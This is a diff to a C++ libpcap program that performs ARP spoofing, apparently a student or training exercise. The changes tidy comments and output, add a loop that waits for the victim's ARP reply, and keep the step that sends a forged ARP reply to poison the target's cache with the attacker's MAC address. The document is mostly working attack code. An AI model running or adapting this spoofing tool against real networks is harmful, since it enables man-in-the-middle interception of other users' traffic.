@@ -28,14 +28,13 @@ void getAttackAddress(const char *iface, unsigned char *mac, char *ip) {
     int fd;
     struct ifreq ifr;
 
-    // Open socket
     fd = socket(AF_INET, SOCK_DGRAM, 0);
     if (fd == -1) {
         perror("socket");
         exit(1);
     }
 
-    // Get MAC address
+    // MAC
     strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
     if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
         perror("ioctl - SIOCGIFHWADDR");
@@ -44,15 +43,13 @@ void getAttackAddress(const char *iface, unsigned char *mac, char *ip) {
     }
     memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
 
-    // Get IP address
+    // IP
     if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
         perror("ioctl - SIOCGIFADDR");
         close(fd);
         exit(1);
     }
     strncpy(ip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), INET_ADDRSTRLEN);
-
-    // Close socket
     close(fd);
 }
 
@@ -64,7 +61,7 @@ int main(int argc, char* argv[]) {
     for(int i = 2; i < argc-1; i+=2) {
         char* dev = argv[1];
         char errbuf[PCAP_ERRBUF_SIZE];
-        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
         if (handle == nullptr) {
             fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
             return -1;
@@ -78,8 +75,8 @@ int main(int argc, char* argv[]) {
 
         char attack_mac[18];
         snprintf(attack_mac, sizeof(attack_mac), "%02x:%02x:%02x:%02x:%02x:%02x", my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);
-        printf("%s\n", attack_ip);
-        printf("%s\n", attack_mac);
+        printf("Attack_IP  : %s\n", attack_ip);
+        printf("Attack_MAC : %s\n", attack_mac);
 
         packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
         packet.eth_.smac_ = Mac(attack_mac);
@@ -103,21 +100,25 @@ int main(int argc, char* argv[]) {
         struct pcap_pkthdr *header;
         const u_char *pkt_data;
         Mac sender_mac;
+        while(true) {
+            res = pcap_next_ex(handle, &header, &pkt_data);
+            if (res == 0) continue;
+            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+                break;
+            }
 
-        res = pcap_next_ex(handle, &header, &pkt_data);
-        if (res == 0) {
-            fprintf(stderr, "Timeout occurred, no packets available return %d error=%s\n", res, pcap_geterr(handle));
-        }
+            EthArpPacket *eth_arp_packet = (EthArpPacket*)pkt_data;
 
-        EthArpPacket *eth_arp_packet = (EthArpPacket*)pkt_data;
-
-        ArpHdr arp_header = eth_arp_packet->arp_;
-        if (arp_header.op() == ArpHdr::Reply) {
-            sender_mac = arp_header.smac();
+            ArpHdr arp_header = eth_arp_packet->arp_;
+            if (arp_header.op() == ArpHdr::Reply) {
+                sender_mac = arp_header.smac();
+                break;
+            }
         }
 
         // ARP Spoofing
-        printf("%s\n", std::string(sender_mac).c_str());
+        printf("Sender MAC : %s\n", std::string(sender_mac).c_str());
         packet.eth_.dmac_ = Mac(std::string(sender_mac).c_str());
         packet.eth_.smac_ = Mac(attack_mac);
         packet.eth_.type_ = htons(EthHdr::Arp);
@@ -135,10 +136,6 @@ int main(int argc, char* argv[]) {
         res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
         if (res != 0) {
             fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-        }
-
-        if (res == -1) {
-            fprintf(stderr, "Error occurred while capturing packets: %s\n", pcap_geterr(handle));
         }
 
         pcap_close(handle);
